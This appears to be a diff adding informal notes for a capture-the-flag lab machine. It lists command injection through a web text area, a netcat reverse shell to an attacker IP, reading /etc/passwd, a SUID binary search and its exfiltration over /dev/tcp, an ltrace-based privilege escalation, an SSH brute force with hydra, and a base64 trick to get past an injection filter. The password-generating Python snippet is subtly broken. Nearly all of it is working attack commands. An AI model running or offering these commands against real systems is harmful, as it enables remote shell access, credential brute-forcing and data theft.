@@ -1,0 +1,45 @@
+1) if we have a text area we can try to use ";ls" then if it works we will do a ";which nc" to do a reverse shell connection, then we wil open terminal and write "nc -lnvp 4444" and press enter then in the website will write the following ";nc -e /bin/bash 192.168.0.192 4444" 
+
+then write 
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+use to know ur priviledg
+find / -perm -u=s 2>/dev/null
+
+then find reset root file , then u need to copy it to your PC by using
+nc -nlvp 9002 > reset_root       in ur termenal
+then victom use 
+cat /usr/bin/reset_root > /dev/tcp/192.168.0.192/9002
+then 
+chmod +x reset_root 
+run
+then use
+ltrace ./reset_root
+then use 
+touch "missing files"
+then run the root reset file by just writing it :)
+
+
+
+      	a) also we can do ";cat /etc/passwd"
+      	
+      	
+2) we use pwd to kwon where am i
+3) if u have a green file just tpye "./fileName"
+4) if u dont have a permission to file try to copy it to your zone
+5) if u find a file try to put a passwd like : "./safe 95842"
+6) small code to generate potential passwd: 
+from string import ascii_uppercase
+for c in ascii_uppercase:
+        for x in range (0,10):
+                print(c) + str(x) + "Flesh"
+                print(c) + str(x) + "Curtains"
+7) small hydra command
+hydra -l RickSanchez -P pw.txt -t4 -s 22222 192.168.0.163 ssh -I
+
+=============
+
+8) some time you can find things in var dir.
+9) if the website didn't allow the nc (1) we can bypass it by using "echo 'the command' | base64" then in the website take it and put "echo 'the output' | base64 -d | bash"
+
+ 
